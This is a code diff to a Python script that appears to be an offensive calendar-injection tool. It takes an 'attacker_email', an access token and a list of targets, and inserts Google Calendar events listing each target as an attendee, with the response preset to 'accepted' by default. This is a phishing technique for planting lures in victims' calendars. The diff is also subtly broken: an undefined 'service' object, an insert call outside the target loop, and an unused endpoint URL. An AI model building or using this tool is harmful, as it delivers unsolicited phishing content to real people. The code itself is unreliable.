@@ -1,16 +1,18 @@
 import requests
 import sys, getopt
+from googleapiclient.discovery import build
 
 def main(argv):
     attacker_email = ''
     access_token = ''
     targets = ''
+    target_list = []
     start_DateTime = ''
     finish_DateTime = ''
     event_title = ''
     event_location = ''
     event_description = ''
-    time_zone = "America/New_York"
+    time_zone = "America/Chicago"
     allow_modify = "false"
     allow_invite_others = "true"
     show_invitees = "false"
@@ -52,8 +54,8 @@ def main(argv):
     help += '\n\t-d <EVENT DESCRIPTION>, --event_description <EVENT DESCRIPTION>'
     help += '\n\t\t\tDescription field for the event'
     help += '\n\t-z [<TIME ZONE>], --time_zone [<TIME ZONE>]'
-    help += '\n\t\t\tTime zone for the event in the format'
-    help += '\n\t\t\t"America/New_York" (default: America/New_York)'
+    help += '\n\t\t\tTime zone for the event in the IANA tz database format:'
+    help += '\n\t\t\t"America/New_York" (default: America/Chicago)'
     help += '\n\t-m [{true, false}], --allow_modify [{true, false}]'
     help += '\n\t\t\tIf set to true allows targets to modify the calendar'
     help += '\n\t\t\tentry (default: false)'
@@ -69,6 +71,7 @@ def main(argv):
     help += '\n\t\t\t"accepted" (default: accepted)'
     help += '\n\n\t-h, --help\t\tshow this help message and exit\n'
 
+# Try parsing options and arguments
     try:
         opts, args = getopt.getopt(argv, "he:x:a:s:f:t:l:d:z:m:i:o:r:",["help","attacker_email=",
             "targets=","access_token=","start_DateTimeat=","finish_DateTime=","event_title=",
@@ -79,6 +82,7 @@ def main(argv):
         print(usage)
         sys.exit(2)
 
+# Parse argumentss into variables
     for opt, arg in opts:
         if opt in ("-h", "--help"):
             print(help)
@@ -95,6 +99,48 @@ def main(argv):
             targets = arg
         if opt in ("-t", "--event_title"):
             event_title = arg
+        if opt in ("-l", "--event_location"):
+            event_location = arg
+        if opt in ("-d", "--event_description"):
+            event_description = arg
+        if opt in ("-m", "--allow_modify"):
+            allow_modify = arg
+        if opt in ("-i", "--allow_invite_others"):
+            allow_invite_others = arg
+        if opt in ("-o", "--show_invitees"):
+            show_invitees = arg
+        if opt in ("-r", "--response_status"):
+            response_status = arg
+        if opt in ("-z", "--time_zone"):
+            time_zone = arg
+
+# check for manadatory arguemnts
+    if not attacker_email:
+        print("\nAttacker Email (-e, --attacker_email) is a mandatory argument\n")
+        print(usage)
+        sys.exit(2)
+    if not targets:
+        print("\nTargets (-x, --targets) is a mandatory argument(s)\n")
+        print(usage)
+        sys.exit(2)
+    if not access_token:
+        print("\nAccess Token (-a, --access_token) is a mandatory argument(s)\n")
+        print(usage)
+        sys.exit(2)
+    if not start_DateTime:
+        print("\nStart DateTime (-s, --start_DateTime) is a mandatory argument(s)\n")
+        print(usage)
+        sys.exit(2)
+    if not finish_DateTime:
+        print("\nFinish DateTime (-f, --finish_DateTime) is a mandatory argument(s)\n")
+        print(usage)
+        sys.exit(2)
+
+
+
+# api endpoint
+    URL = "https://www.googleapis.com/calendars/" + attacker_email + "/events"
+    target_list = targets.split(",")
 
 # Debugging
     print("Access Token: " + access_token)
@@ -103,10 +149,43 @@ def main(argv):
     print("Finish DateTime: " + finish_DateTime)
     print("Targets: " + targets)
     print("Event Title: " + event_title)
+    print("Event Location: " + event_location)
+    print("Event Description: " + event_description)
+    print("Allow Modify: " + allow_modify)
+    print("Allow Invite Others: " + allow_invite_others)
+    print("Show Invitees: " + show_invitees)
+    print("Response Status: " + response_status)
+    print("Time Zone: " + time_zone)
+    for item in target_list:
+        print("Target:" + item)
+    print("API Endpoint: " +URL)
 # End Debugging
 
-# api endpoint
-#URL = "https://www.googleapis.com/calendars/" + ATTACKER_EMAIL + "/events"
+# Event Data to be sent to the api
+    for target in target_list:
+        event = {
+            'summary': event_title,
+            'location': event_location,
+            'description': event_description,
+            'start': {
+                'dateTime': start_DateTime,
+                'timeZone': time_zone,
+            },
+            'end': {
+                'dateTime': finish_DateTime,
+                'timeZone': time_zone
+            },
+            'attendees': [
+                {'email': target,'responseStatus': response_status},
+            ],
+            'guestsCanInviteOthers': allow_invite_others,
+            'guestsCanSeeOtherGuests': show_invitees,
+            'guestsCanModify': allow_modify
+        }
+    event = service.events().insert(calendarId='primary', body=event).execute()
+    print ('Event created: %s' % (event.get('htmlLink')))
+
+
 
 if __name__ == "__main__":
     main(sys.argv[1:])
